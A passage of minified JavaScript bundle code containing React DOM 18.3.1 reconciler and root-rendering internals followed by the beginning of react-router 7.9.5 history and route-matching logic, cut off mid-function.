A=u.child;if(u.subtreeFlags&2064&&A!==null)A.return=u,ze=A;else e:for(u=T;ze!==null;){if(f=ze,f.flags&2048)try{switch(f.tag){case 0:case 11:case 15:Lf(9,f)}}catch(M){Kt(f,f.return,M)}if(f===u){ze=null;break e}var _=f.sibling;if(_!==null){_.return=f.return,ze=_;break e}ze=f.return}}if(mt=a,Ia(),ci&&typeof ci.onPostCommitFiberRoot=="function")try{ci.onPostCommitFiberRoot(wf,e)}catch{}r=!0}return r}finally{St=n,_r.transition=t}}return!1}function jv(e,t,n){t=Cl(n,t),t=fw(e,t,1),e=ka(e,t,1),t=Zn(),e!==null&&(zu(e,1,t),ur(e,t))}function Kt(e,t,n){if(e.tag===3)jv(e,e,n);else for(;t!==null;){if(t.tag===3){jv(t,e,n);break}else if(t.tag===1){var r=t.stateNode;if(typeof t.type.getDerivedStateFromError=="function"||typeof r.componentDidCatch=="function"&&(Ta===null||!Ta.has(r))){e=Cl(n,e),e=hw(t,e,1),t=ka(t,e,1),e=Zn(),t!==null&&(zu(t,1,e),ur(t,e));break}}t=t.return}}function dD(e,t,n){var r=e.pingCache;r!==null&&r.delete(t),t=Zn(),e.pingedLanes|=e.suspendedLanes&n,wn===e&&(An&n)===n&&(mn===4||mn===3&&(An&130023424)===An&&500>en()-Ng?as(e,0):Sg|=n),ur(e,t)}function Pw(e,t){t===0&&(e.mode&1?(t=Vc,Vc<<=1,!(Vc&130023424)&&(Vc=4194304)):t=1);var n=Zn();e=Pi(e,t),e!==null&&(zu(e,t,n),ur(e,n))}function fD(e){var t=e.memoizedState,n=0;t!==null&&(n=t.retryLane),Pw(e,n)}function hD(e,t){var n=0;switch(e.tag){case 13:var r=e.stateNode,a=e.memoizedState;a!==null&&(n=a.retryLane);break;case 19:r=e.stateNode;break;default:throw Error(Se(314))}r!==null&&r.delete(t),Pw(e,n)}var jw;jw=function(e,t,n){if(e!==null)if(e.memoizedProps!==t.pendingProps||lr.current)sr=!0;else{if(!(e.lanes&n)&&!(t.flags&128))return sr=!1,eD(e,t,n);sr=!!(e.flags&131072)}else sr=!1,zt&&t.flags&1048576&&ME(t,Vd,t.index);switch(t.lanes=0,t.tag){case 2:var r=t.type;kd(e,t),e=t.pendingProps;var a=El(t,Fn.current);hl(t,n),a=bg(null,t,r,e,a,n);var l=Eg();return t.flags|=1,typeof a=="object"&&a!==null&&typeof a.render=="function"&&a.$$typeof===void 0?(t.tag=1,t.memoizedState=null,t.updateQueue=null,or(r)?(l=!0,$d(t)):l=!1,t.memoizedState=a.state!==null&&a.state!==void 0?a.state:null,mg(t),a.updater=Df,t.stateNode=a,a._reactInternals=t,Zm(t,r,e,n),t=t0(null,t,r,!0,l,n)):(t.tag=0,zt&&l&&og(t),Qn(null,t,a,n),t=t.child),t;case 16:r=t.elementType;e:{switch(kd(e,t),e=t.pendingProps,a=r._init,r=a(r._payload),t.type=r,a=t.tag=mD(r),e=qr(r,e),a){case 0:t=e0(null,t,r,e,n);break e;case 1:t=Tv(null,t,r,e,n);break e;case 11:t=wv(null,t,r,e,n);break e;case 14:t=kv(null,t,r,qr(r.type,e),n);break e}throw Error(Se(306,r,""))}return t;case 0:return r=t.type,a=t.pendingProps,a=t.elementType===r?a:qr(r,a),e0(e,t,r,a,n);case 1:return r=t.type,a=t.pendingProps,a=t.elementType===r?a:qr(r,a),Tv(e,t,r,a,n);case 3:e:{if(xw(t),e===null)throw Error(Se(387));r=t.pendingProps,l=t.memoizedState,a=l.element,qE(e,t),Kd(t,r,null,n);var u=t.memoizedState;if(r=u.element,l.isDehydrated)if(l={element:r,isDehydrated:!1,cache:u.cache,pendingSuspenseBoundaries:u.pendingSuspenseBoundaries,transitions:u.transitions},t.updateQueue.baseState=l,t.memoizedState=l,t.flags&256){a=Cl(Error(Se(423)),t),t=Cv(e,t,r,n,a);break e}else if(r!==a){a=Cl(Error(Se(424)),t),t=Cv(e,t,r,n,a);break e}else for(xr=wa(t.stateNode.containerInfo.firstChild),yr=t,zt=!0,Yr=null,n=zE(t,null,r,n),t.child=n;n;)n.flags=n.flags&-3|4096,n=n.sibling;else{if(wl(),r===a){t=ji(e,t,n);break e}Qn(e,t,r,n)}t=t.child}return t;case 5:return $E(t),e===null&&Qm(t),r=t.type,a=t.pendingProps,l=e!==null?e.memoizedProps:null,u=a.children,qm(r,a)?u=null:l!==null&&qm(r,l)&&(t.flags|=32),gw(e,t),Qn(e,t,u,n),t.child;case 6:return e===null&&Qm(t),null;case 13:return yw(e,t,n);case 4:return gg(t,t.stateNode.containerInfo),r=t.pendingProps,e===null?t.child=kl(t,null,r,n):Qn(e,t,r,n),t.child;case 11:return r=t.type,a=t.pendingProps,a=t.elementType===r?a:qr(r,a),wv(e,t,r,a,n);case 7:return Qn(e,t,t.pendingProps,n),t.child;case 8:return Qn(e,t,t.pendingProps.children,n),t.child;case 12:return Qn(e,t,t.pendingProps.children,n),t.child;case 10:e:{if(r=t.type._context,a=t.pendingProps,l=t.memoizedProps,u=a.value,It(Gd,r._currentValue),r._currentValue=u,l!==null)if(Kr(l.value,u)){if(l.children===a.children&&!lr.current){t=ji(e,t,n);break e}}else for(l=t.child,l!==null&&(l.return=t);l!==null;){var f=l.dependencies;if(f!==null){u=l.child;for(var h=f.firstContext;h!==null;){if(h.context===r){if(l.tag===1){h=Di(-1,n&-n),h.tag=2;var m=l.updateQueue;if(m!==null){m=m.shared;var x=m.pending;x===null?h.next=h:(h.next=x.next,x.next=h),m.pending=h}}l.lanes|=n,h=l.alternate,h!==null&&(h.lanes|=n),Km(l.return,n,t),f.lanes|=n;break}h=h.next}}else if(l.tag===10)u=l.type===t.type?null:l.child;else if(l.tag===18){if(u=l.return,u===null)throw Error(Se(341));u.lanes|=n,f=u.alternate,f!==null&&(f.lanes|=n),Km(u,n,t),u=l.sibling}else u=l.child;if(u!==null)u.return=l;else for(u=l;u!==null;){if(u===t){u=null;break}if(l=u.sibling,l!==null){l.return=u.return,u=l;break}u=u.return}l=u}Qn(e,t,a.children,n),t=t.child}return t;case 9:return a=t.type,r=t.pendingProps.children,hl(t,n),a=Ir(a),r=r(a),t.flags|=1,Qn(e,t,r,n),t.child;case 14:return r=t.type,a=qr(r,t.pendingProps),a=qr(r.type,a),kv(e,t,r,a,n);case 15:return pw(e,t,t.type,t.pendingProps,n);case 17:return r=t.type,a=t.pendingProps,a=t.elementType===r?a:qr(r,a),kd(e,t),t.tag=1,or(r)?(e=!0,$d(t)):e=!1,hl(t,n),dw(t,r,a),Zm(t,r,a,n),t0(null,t,r,!0,e,n);case 19:return vw(e,t,n);case 22:return mw(e,t,n)}throw Error(Se(156,t.tag))};function Rw(e,t){return oE(e,t)}function pD(e,t,n,r){this.tag=e,this.key=n,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=t,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=r,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function Lr(e,t,n,r){return new pD(e,t,n,r)}function _g(e){return e=e.prototype,!(!e||!e.isReactComponent)}function mD(e){if(typeof e=="function")return _g(e)?1:0;if(e!=null){if(e=e.$$typeof,e===K0)return 11;if(e===X0)return 14}return 2}function Sa(e,t){var n=e.alternate;return n===null?(n=Lr(e.tag,t,e.key,e.mode),n.elementType=e.elementType,n.type=e.type,n.stateNode=e.stateNode,n.alternate=e,e.alternate=n):(n.pendingProps=t,n.type=e.type,n.flags=0,n.subtreeFlags=0,n.deletions=null),n.flags=e.flags&14680064,n.childLanes=e.childLanes,n.lanes=e.lanes,n.child=e.child,n.memoizedProps=e.memoizedProps,n.memoizedState=e.memoizedState,n.updateQueue=e.updateQueue,t=e.dependencies,n.dependencies=t===null?null:{lanes:t.lanes,firstContext:t.firstContext},n.sibling=e.sibling,n.index=e.index,n.ref=e.ref,n}function Sd(e,t,n,r,a,l){var u=2;if(r=e,typeof e=="function")_g(e)&&(u=1);else if(typeof e=="string")u=5;else e:switch(e){case Xs:return ss(n.children,a,l,t);case Q0:u=8,a|=8;break;case wm:return e=Lr(12,n,t,a|2),e.elementType=wm,e.lanes=l,e;case km:return e=Lr(13,n,t,a),e.elementType=km,e.lanes=l,e;case Tm:return e=Lr(19,n,t,a),e.elementType=Tm,e.lanes=l,e;case $2:return If(n,a,l,t);default:if(typeof e=="object"&&e!==null)switch(e.$$typeof){case W2:u=10;break e;case q2:u=9;break e;case K0:u=11;break e;case X0:u=14;break e;case ua:u=16,r=null;break e}throw Error(Se(130,e==null?e:typeof e,""))}return t=Lr(u,n,t,a),t.elementType=e,t.type=r,t.lanes=l,t}function ss(e,t,n,r){return e=Lr(7,e,r,t),e.lanes=n,e}function If(e,t,n,r){return e=Lr(22,e,r,t),e.elementType=$2,e.lanes=n,e.stateNode={isHidden:!1},e}function Gp(e,t,n){return e=Lr(6,e,null,t),e.lanes=n,e}function Qp(e,t,n){return t=Lr(4,e.children!==null?e.children:[],e.key,t),t.lanes=n,t.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},t}function gD(e,t,n,r,a){this.tag=t,this.containerInfo=e,this.finishedWork=this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.pendingContext=this.context=null,this.callbackPriority=0,this.eventTimes=Dp(0),this.expirationTimes=Dp(-1),this.entangledLanes=this.finishedLanes=this.mutableReadLanes=this.expiredLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=Dp(0),this.identifierPrefix=r,this.onRecoverableError=a,this.mutableSourceEagerHydrationData=null}function Ig(e,t,n,r,a,l,u,f,h){return e=new gD(e,t,n,f,h),t===1?(t=1,l===!0&&(t|=8)):t=0,l=Lr(3,null,null,t),e.current=l,l.stateNode=e,l.memoizedState={element:r,isDehydrated:n,cache:null,transitions:null,pendingSuspenseBoundaries:null},mg(l),e}function xD(e,t,n){var r=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:Ks,key:r==null?null:""+r,children:e,containerInfo:t,implementation:n}}function Ow(e){if(!e)return Aa;e=e._reactInternals;e:{if(vs(e)!==e||e.tag!==1)throw Error(Se(170));var t=e;do{switch(t.tag){case 3:t=t.stateNode.context;break e;case 1:if(or(t.type)){t=t.stateNode.__reactInternalMemoizedMergedChildContext;break e}}t=t.return}while(t!==null);throw Error(Se(171))}if(e.tag===1){var n=e.type;if(or(n))return OE(e,n,t)}return t}function Fw(e,t,n,r,a,l,u,f,h){return e=Ig(n,r,!0,e,a,l,u,f,h),e.context=Ow(null),n=e.current,r=Zn(),a=Ca(n),l=Di(r,a),l.callback=t??null,ka(n,l,a),e.current.lanes=a,zu(e,a,r),ur(e,r),e}function Pf(e,t,n,r){var a=t.current,l=Zn(),u=Ca(a);return n=Ow(n),t.context===null?t.context=n:t.pendingContext=n,t=Di(l,u),t.payload={element:e},r=r===void 0?null:r,r!==null&&(t.callback=r),e=ka(a,t,u),e!==null&&(Gr(e,a,u,l),bd(e,a,u)),u}function af(e){if(e=e.current,!e.child)return null;switch(e.child.tag){case 5:return e.child.stateNode;default:return e.child.stateNode}}function Rv(e,t){if(e=e.memoizedState,e!==null&&e.dehydrated!==null){var n=e.retryLane;e.retryLane=n!==0&&n<t?n:t}}function Pg(e,t){Rv(e,t),(e=e.alternate)&&Rv(e,t)}function yD(){return null}var Mw=typeof reportError=="function"?reportError:function(e){console.error(e)};function jg(e){this._internalRoot=e}jf.prototype.render=jg.prototype.render=function(e){var t=this._internalRoot;if(t===null)throw Error(Se(409));Pf(e,t,null,null)};jf.prototype.unmount=jg.prototype.unmount=function(){var e=this._internalRoot;if(e!==null){this._internalRoot=null;var t=e.containerInfo;hs(function(){Pf(null,e,null,null)}),t[Ii]=null}};function jf(e){this._internalRoot=e}jf.prototype.unstable_scheduleHydration=function(e){if(e){var t=mE();e={blockedOn:null,target:e,priority:t};for(var n=0;n<fa.length&&t!==0&&t<fa[n].priority;n++);fa.splice(n,0,e),n===0&&xE(e)}};function Rg(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11)}function Rf(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11&&(e.nodeType!==8||e.nodeValue!==" react-mount-point-unstable "))}function Ov(){}function vD(e,t,n,r,a){if(a){if(typeof r=="function"){var l=r;r=function(){var m=af(u);l.call(m)}}var u=Fw(t,r,e,0,null,!1,!1,"",Ov);return e._reactRootContainer=u,e[Ii]=u.current,bu(e.nodeType===8?e.parentNode:e),hs(),u}for(;a=e.lastChild;)e.removeChild(a);if(typeof r=="function"){var f=r;r=function(){var m=af(h);f.call(m)}}var h=Ig(e,0,!1,null,null,!1,!1,"",Ov);return e._reactRootContainer=h,e[Ii]=h.current,bu(e.nodeType===8?e.parentNode:e),hs(function(){Pf(t,h,n,r)}),h}function Of(e,t,n,r,a){var l=n._reactRootContainer;if(l){var u=l;if(typeof a=="function"){var f=a;a=function(){var h=af(u);f.call(h)}}Pf(t,u,e,a)}else u=vD(n,t,e,a,r);return af(u)}hE=function(e){switch(e.tag){case 3:var t=e.stateNode;if(t.current.memoizedState.isDehydrated){var n=qo(t.pendingLanes);n!==0&&(eg(t,n|1),ur(t,en()),!(mt&6)&&(Sl=en()+500,Ia()))}break;case 13:hs(function(){var r=Pi(e,1);if(r!==null){var a=Zn();Gr(r,e,1,a)}}),Pg(e,1)}};tg=function(e){if(e.tag===13){var t=Pi(e,134217728);if(t!==null){var n=Zn();Gr(t,e,134217728,n)}Pg(e,134217728)}};pE=function(e){if(e.tag===13){var t=Ca(e),n=Pi(e,t);if(n!==null){var r=Zn();Gr(n,e,t,r)}Pg(e,t)}};mE=function(){return St};gE=function(e,t){var n=St;try{return St=e,t()}finally{St=n}};jm=function(e,t,n){switch(t){case"input":if(Nm(e,n),t=n.name,n.type==="radio"&&t!=null){for(n=e;n.parentNode;)n=n.parentNode;for(n=n.querySelectorAll("input[name="+JSON.stringify(""+t)+'][type="radio"]'),t=0;t<n.length;t++){var r=n[t];if(r!==e&&r.form===e.form){var a=Sf(r);if(!a)throw Error(Se(90));V2(r),Nm(r,a)}}}break;case"textarea":Q2(e,n);break;case"select":t=n.value,t!=null&&ul(e,!!n.multiple,t,!1)}};nE=Ag;rE=hs;var bD={usingClientEntryPoint:!1,Events:[qu,tl,Sf,eE,tE,Ag]},_o={findFiberByHostInstance:ts,bundleType:0,version:"18.3.1",rendererPackageName:"react-dom"},ED={bundleType:_o.bundleType,version:_o.version,rendererPackageName:_o.rendererPackageName,rendererConfig:_o.rendererConfig,overrideHookState:null,overrideHookStateDeletePath:null,overrideHookStateRenamePath:null,overrideProps:null,overridePropsDeletePath:null,overridePropsRenamePath:null,setErrorHandler:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:Hi.ReactCurrentDispatcher,findHostInstanceByFiber:function(e){return e=sE(e),e===null?null:e.stateNode},findFiberByHostInstance:_o.findFiberByHostInstance||yD,findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null,reconcilerVersion:"18.3.1-next-f1338f8080-20240426"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var id=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!id.isDisabled&&id.supportsFiber)try{wf=id.inject(ED),ci=id}catch{}}Er.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=bD;Er.createPortal=function(e,t){var n=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!Rg(t))throw Error(Se(200));return xD(e,t,null,n)};Er.createRoot=function(e,t){if(!Rg(e))throw Error(Se(299));var n=!1,r="",a=Mw;return t!=null&&(t.unstable_strictMode===!0&&(n=!0),t.identifierPrefix!==void 0&&(r=t.identifierPrefix),t.onRecoverableError!==void 0&&(a=t.onRecoverableError)),t=Ig(e,1,!1,null,null,n,!1,r,a),e[Ii]=t.current,bu(e.nodeType===8?e.parentNode:e),new jg(t)};Er.findDOMNode=function(e){if(e==null)return null;if(e.nodeType===1)return e;var t=e._reactInternals;if(t===void 0)throw typeof e.render=="function"?Error(Se(188)):(e=Object.keys(e).join(","),Error(Se(268,e)));return e=sE(t),e=e===null?null:e.stateNode,e};Er.flushSync=function(e){return hs(e)};Er.hydrate=function(e,t,n){if(!Rf(t))throw Error(Se(200));return Of(null,e,t,!0,n)};Er.hydrateRoot=function(e,t,n){if(!Rg(e))throw Error(Se(405));var r=n!=null&&n.hydratedSources||null,a=!1,l="",u=Mw;if(n!=null&&(n.unstable_strictMode===!0&&(a=!0),n.identifierPrefix!==void 0&&(l=n.identifierPrefix),n.onRecoverableError!==void 0&&(u=n.onRecoverableError)),t=Fw(t,null,e,1,n??null,a,!1,l,u),e[Ii]=t.current,bu(e),r)for(e=0;e<r.length;e++)n=r[e],a=n._getVersion,a=a(n._source),t.mutableSourceEagerHydrationData==null?t.mutableSourceEagerHydrationData=[n,a]:t.mutableSourceEagerHydrationData.push(n,a);return new jf(t)};Er.render=function(e,t,n){if(!Rf(t))throw Error(Se(200));return Of(null,e,t,!1,n)};Er.unmountComponentAtNode=function(e){if(!Rf(e))throw Error(Se(40));return e._reactRootContainer?(hs(function(){Of(null,null,e,!1,function(){e._reactRootContainer=null,e[Ii]=null})}),!0):!1};Er.unstable_batchedUpdates=Ag;Er.unstable_renderSubtreeIntoContainer=function(e,t,n,r){if(!Rf(n))throw Error(Se(200));if(e==null||e._reactInternals===void 0)throw Error(Se(38));return Of(e,t,n,!1,r)};Er.version="18.3.1-next-f1338f8080-20240426";function Bw(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(Bw)}catch(e){console.error(e)}}Bw(),B2.exports=Er;var wD=B2.exports,Fv=wD;bm.createRoot=Fv.createRoot,bm.hydrateRoot=Fv.hydrateRoot;/**
 * react-router v7.9.5
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */var Mv="popstate";function kD(e={}){function t(r,a){let{pathname:l,search:u,hash:f}=r.location;return h0("",{pathname:l,search:u,hash:f},a.state&&a.state.usr||null,a.state&&a.state.key||"default")}function n(r,a){return typeof a=="string"?a:Du(a)}return CD(t,n,null,e)}function Wt(e,t){if(e===!1||e===null||typeof e>"u")throw new Error(t)}function jr(e,t){if(!e){typeof console<"u"&&console.warn(t);try{throw new Error(t)}catch{}}}function TD(){return Math.random().toString(36).substring(2,10)}function Bv(e,t){return{usr:e.state,key:e.key,idx:t}}function h0(e,t,n=null,r){return{pathname:typeof e=="string"?e:e.pathname,search:"",hash:"",...typeof t=="string"?Rl(t):t,state:n,key:t&&t.key||r||TD()}}function Du({pathname:e="/",search:t="",hash:n=""}){return t&&t!=="?"&&(e+=t.charAt(0)==="?"?t:"?"+t),n&&n!=="#"&&(e+=n.charAt(0)==="#"?n:"#"+n),e}function Rl(e){let t={};if(e){let n=e.indexOf("#");n>=0&&(t.hash=e.substring(n),e=e.substring(0,n));let r=e.indexOf("?");r>=0&&(t.search=e.substring(r),e=e.substring(0,r)),e&&(t.pathname=e)}return t}function CD(e,t,n,r={}){let{window:a=document.defaultView,v5Compat:l=!1}=r,u=a.history,f="POP",h=null,m=x();m==null&&(m=0,u.replaceState({...u.state,idx:m},""));function x(){return(u.state||{idx:null}).idx}function g(){f="POP";let O=x(),N=O==null?null:O-m;m=O,h&&h({action:f,location:P.location,delta:N})}function b(O,N){f="PUSH";let T=h0(P.location,O,N);m=x()+1;let A=Bv(T,m),_=P.createHref(T);try{u.pushState(A,"",_)}catch(M){if(M instanceof DOMException&&M.name==="DataCloneError")throw M;a.location.assign(_)}l&&h&&h({action:f,location:P.location,delta:1})}function E(O,N){f="REPLACE";let T=h0(P.location,O,N);m=x();let A=Bv(T,m),_=P.createHref(T);u.replaceState(A,"",_),l&&h&&h({action:f,location:P.location,delta:0})}function C(O){return SD(O)}let P={get action(){return f},get location(){return e(a,u)},listen(O){if(h)throw new Error("A history only accepts one active listener");return a.addEventListener(Mv,g),h=O,()=>{a.removeEventListener(Mv,g),h=null}},createHref(O){return t(a,O)},createURL:C,encodeLocation(O){let N=C(O);return{pathname:N.pathname,search:N.search,hash:N.hash}},push:b,replace:E,go(O){return u.go(O)}};return P}function SD(e,t=!1){let n="http://localhost";typeof window<"u"&&(n=window.location.origin!=="null"?window.location.origin:window.location.href),Wt(n,"No window.location.(origin|href) available to create URL");let r=typeof e=="string"?e:Du(e);return r=r.replace(/ $/,"%20"),!t&&r.startsWith("//")&&(r=n+r),new URL(r,n)}function Hw(e,t,n="/"){return ND(e,t,n,!1)}function ND(e,t,n,r){let a=typeof t=="string"?Rl(t):t,l=Ri(a.pathname||"/",n);if(l==null)return null;let u=Uw(e);AD(u);let f=null;for(let h=0;f==null&&h<u.length;++h){let m=BD(l);f=FD(u[h],m,r)}return f}function Uw(e,t=[],n=[],r="",a=!1){let l=(u,f,h=a,m)=>{let x={relativePath:m===void 0?u.path||"":m,caseSensitive:u.caseSensitive===!0,childrenIndex:f,route:u};if(x.relativePath.startsWith("/")){if(!x.relativePath.startsWith(r)&&h)return;Wt(x.relativePath.startsWith(r),`Absolute route path "${x.relativePath}" nested under path "${r}" is not valid. An absolute child route path must start with the combined path of all its parent routes.`),x.relativePath=x.relativePath.slice(r.length)}let g=Li([r,x.relativePath]),b=n.concat(x);u.children&&u.children.length>0&&(Wt(u.index!==!0,`Index routes must not have child routes. Please remove all child routes from route path "${g}".`),Uw(u.children,t,b,g,h)),!(u.path==null&&!u.index)&&t.push({path:g,score:RD(g,u.index),routesMeta:b})};return e.forEach((u,f)=>{var h;if(u.path===""||!((h=u.path)!=null&&h.includes("?")))l(u,f);else for(let m of zw(u.path))l(u,f,!0,m)}),t}function zw(e){let t=e.split("/");if(t.length===0)return[];let[n,...r]=t,a=n.endsWith("?"),l=n.replace(/\?$/,"");if(r.length===0)return a?[l,""]:[l];let u=zw(r.join("/")),f=[];return f.push(...u.map(h=>h===""?l:[l,h].join("/"))),a&&f.push(...u),f.map(h=>e.startsWith("/")&&h===""?"/":h)}function AD(e){e.sort((t,n)=>t.score!==n.score?n.score-t.score:OD(t.routesMeta.map(r=>r.childrenIndex),n.routesMeta.map(r=>r.childrenIndex)))}var DD=/^:[\w-]+$/,LD=3,_D=2,ID=1,PD=10,jD=-2,Hv=e=>e==="*";function RD(e,t){let n=e.split("/"),r=n.length;return n.some(Hv)&&(r+=jD),t&&(r+=_D),n.filter(a=>!Hv(a)).reduce((a,l)=>a+(DD.test(l)?LD:l===""?ID:PD),r)}function OD(e,t){return e.length===t.length&&e.slice(0,-1).every((r,a)=>r===t[a])?e[e.length-1]-t[t.length-1]:0}function FD(e,t,n=!1){let{routesMeta:r}=e,a={},l="/",u=[];for(let f=0;f<r.length;++f){let h=r[f],m=f===r.length-1,x=l==="/"?t:t.slice(l.length)||"/",g=sf({path:h.relativePath,caseSensitive:h.caseSensitive,end:m},x),b=h.route;if(!g&&m&&n&&!r[r.length-1].route.index&&(g=sf({path:h.relativePath,caseSensitive:h.caseSensitive,end:!1},x)),!g)return null;Object.assign(a,g.params),u.push({params:a,pathname:Li([l,g.pathname]),pathnameBase:WD(Li([l,g.pathnameBase])),route:b}),g.pathnameBase!=="/"&&(l=Li([l,g.pathnameBase]))}return u}function sf(e,t){typeof e=="string"&&(e={path:e,caseSensitive:!1,end:!0});let[n,r]=MD(e.path,e.caseSensitive,e.end),a=t.match(n);if(!a)return null;let l=a[0],u=l.replace(/(.)\/+$/,"$1"),f=a.slice(1);return{params:r.reduce((m,{paramName:x,isOptional:g},b)=>{if(x==="*"){let C=f[b]||"";u=l.slice(0,l.length-C.length).replace(/(.)\/+$/,"$1")}const E=f[b];return g&&!E?m[x]=void 0:m[x]=(E||"").replace(/%2F/g,"/"),m},{}),pathname:l,pathnameBase:u,pattern:e}}function MD(e,t=!1,n=!0){jr(e==="*"||!e.endsWith("*")||e.endsWith("/*"),`Route path "${e}" will be treated as if it were "${e.replace(/\*$/,"/*")}" because the \`*\` character must always follow a \`/\` in the pattern. To get rid of this warning, please change the route path to "${e.replace(/\*$/,"/*")}".`);let r=[],a="^"+e.replace(/\/*\*?$/,"").replace(/^\/*/,"/").replace(/[\\.*+^${}|()[\]]/g,"\\$&").replace(/\/:([\w-]+)(\?)?/g,(u,f,h)=>(r.push({paramName:f,isOptional:h!=null}),h?"/?([^\\/]+)?":"/([^\\/]+)")).replace(/\/([\w-]+)\?(\/|$)/g,"(/$1)?$2");return e.endsWith("*")?(r.push({paramName:"*"}),a+=e==="*"||e==="/*"?"(.*)$":"(?:\\/(.+)|\\/*)$"):n?a+="\\/*$":e!==""&&e!=="/"&&(a+="(?:(?=\\/|$))"),[new RegExp(a,t?void 0:"i"),r]}function BD(e){try{return e.split("/").map(t=>decodeURIComponent(t).replace(/\//g,"%2F")).join("/")}catch(t){return jr(!1,`The URL path "${e}" could not be decoded because it is a malformed URL segment. This is probably due to a bad percent encoding (${t}).`),e}}function Ri(e,t){if(t==="/")return e;if(!e.toLowerCase().startsWith(t.toLowerCase()))return null;let n=t.endsWith("/")?t.length-1:t.length,r=e.charAt(n);return r&&r!=="/"?null:e.slice(n)||"/"}function HD(e,t="/"){let{pathname:n,search:r="",hash:a=""}=typeof e=="string"?Rl(e):e;return{pathname:n?n.startsWith("/")?n:UD(n,t):t,search:qD(r),hash:$D(a)}}function UD(e,t){let n=t.replace(/\/+$/,"").split("/");return e.split("/").forEach(a=>{a===".."?n.length>1&&n.pop():a!=="."&&n.push(a)}),n.length>1?n.join("/"):"/"}function Kp(e,t,n,r){return`Cannot include a '${e}' character in a manually specified \`to.${t}\` field [${JSON.stringify(r)}].  Please separate it out to the \`to.${n}\` field. Alternatively you may provide the full path as a string in <Link to="..."> and the router will parse it for you.`}function zD(e){return e.filter((t,n)=>n===0||t.route.path&&t.route.path.length>0)}function Og(e){let t=zD(e);return t.map((n,r)=>r===t.length-1?n.pathname:n.pathnameBase)}function Fg(e,t,n,r=!1){let a;typeof e=="string"?a=Rl(e):(a={...e},Wt(!a.pathname||!a.pathname.includes("?"),Kp("?","pathname","search",a)),Wt(!a.pathname||!a.pathname.includes("#"),Kp("#","pathname","hash",a)),Wt(!a.search||!a.search.includes("#"),Kp("#","search","hash",a)));let l=e===""||a.pathname==="",u=l?"/":a.pathname,f;if(u==null)f=n;else{let g=t.length-1;if(!r&&u.startsWith("..")){let b=u.split("/");for(;b[0]==="..";)b.shift(),g-=1;a.pathname=b.join("/")}f=g>=0?t[g]:"/"}let h=HD(a,f),m=u&&u!=="/"&&u.endsWith("/"),x=(l||u===".")&&n.endsWith("/");return!h.pathname.endsWith("/")&&(m||x)&&(h.pathname+="/"),h}var Li=e=>e.join("/").replace(/\/\/+/g,"/"),WD=e=>e.replace(/\/+$/,"").replace(/^\/*/,"/"),qD=e=>!e||e==="?"?"":e.startsWith("?")?e:"?"+e,$D=e=>!e||e==="#"?"":e.startsWith("#")?e:"#"+e;function YD(e){return e!=null&&typeof e.status=="number"&&typeof e.statusText=="string"&&typeof e.internal=="boolean"&&"data"in e}Object.getOwnPropertyNames(Object.prototype).sort().join("\0");var Ww=["POST","PUT","PATCH","DELETE"];new Set(Ww);var VD=["GET",...Ww];new Set(VD);var Ol=j.createContext(null);Ol.displayName="DataRouter";var Ff=j.createContext(null);Ff.displayName="DataRouterState";j.createContext(!1);var qw=j.createContext({isTransitioning:!1});qw.displayName="ViewTransition";var GD=j.createContext(new Map);GD.displayName="Fetchers";var QD=j.createContext(null);QD.displayName="Await";var Zr=j.createContext(null);Zr.displayName="Navigation";var Yu=j.createContext(null);Yu.displayName="Location";var Rr=j.createContext({outlet:null,matches:[],isDataRoute:!1});Rr.displayName="Route";var Mg=j.createContext(null);Mg.displayName="RouteError";function KD(e,{relative:t}={}){Wt(Fl(),"useHref() may be used only in the context of a <Router> component.");let{basename:n,navigator:r}=j.useContext(Zr),{hash:a,pathname:l,search:u}=Gu(e,{relative:t}),f=l;return n!=="/"&&(f=l==="/"?n:Li([n,l])),r.createHref({pathname:f,search:u,hash:a})}function Fl(){return j.useContext(Yu)!=null}function Or(){return Wt(Fl(),"useLocation() may be used only in the context of a <Router> component."),j.useContext(Yu).location}var $w="You should call navigate() in a React.useEffect(), not when your component is first rendered.";function Yw(e){j.useContext(Zr).static||j.useLayoutEffect(e)}function Ln(){let{isDataRoute:e}=j.useContext(Rr);return e?d4():XD()}function XD(){Wt(Fl(),"useNavigate() may be used only in the context of a <Router> component.");let e=j.useContext(Ol),{basename:t,navigator:n}=j.useContext(Zr),{matches:r}=j.useContext(Rr),{pathname:a}=Or(),l=JSON.stringify(Og(r)),u=j.useRef(!1);return Yw(()=>{u.current=!0}),j.useCallback((h,m={})=>{if(jr(u.current,$w),!u.current)return;if(typeof h=="number"){n.go(h);return}let x=Fg(h,JSON.parse(l),a,m.relative==="path");e==null&&t!=="/"&&(x.pathname=x.pathname==="/"?t:Li([t,x.pathname])),(m.replace?n.replace:n.push)(x,m.state,m)},[t,n,l,a,e])}var ZD=j.createContext(null);function JD(e){let t=j.useContext(Rr).outlet;return j.useMemo(()=>t&&j.createElement(ZD.Provider,{value:e},t),[t,e])}function Vu(){let{matches:e}=j.useContext(Rr),t=e[e.length-1];return t?t.params:{}}function Gu(e,{relative:t}={}){let{matches:n}=j.useContext(Rr),{pathname:r}=Or(),a=JSON.stringify(Og(n));return 